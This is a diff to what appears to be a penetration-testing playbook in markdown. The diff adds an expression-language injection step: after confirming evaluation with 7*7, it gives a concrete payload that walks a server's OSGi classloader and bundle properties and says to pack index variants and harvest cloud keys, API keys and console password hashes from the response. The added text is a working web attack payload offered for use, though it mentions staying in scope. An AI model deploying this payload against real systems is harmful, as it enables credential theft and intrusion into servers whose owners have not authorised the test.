@@ -55,7 +55,16 @@ curl -sk -X POST "$T/cloudsettings.bulkimportConfig.json" \
 ```
 
 Fetch step 2 path again. Look for **49** (`7*7`).  
-If yes and scope allows: one config-leak payload family using `pageContext.class.classLoader...properties` (see `reference/09-modern-bugs.md`). Do **not** brute all day — temp nodes get cleaned.
+
+If math works and scope allows config leak, set `action` to EL that walks OSGi properties (Assetnote research). Example family:
+
+```text
+#{pageContext.class.classLoader.bundle.bundleContext.bundles[0].registeredServices[0].properties}
+```
+
+You can pack many index variants in one payload; failed indexes become blank.  
+Look for cloud keys, API keys, console password hashes in the response.  
+**Few shots/day** historically (temp node cleanup) — do not spam.
 
 ---
 
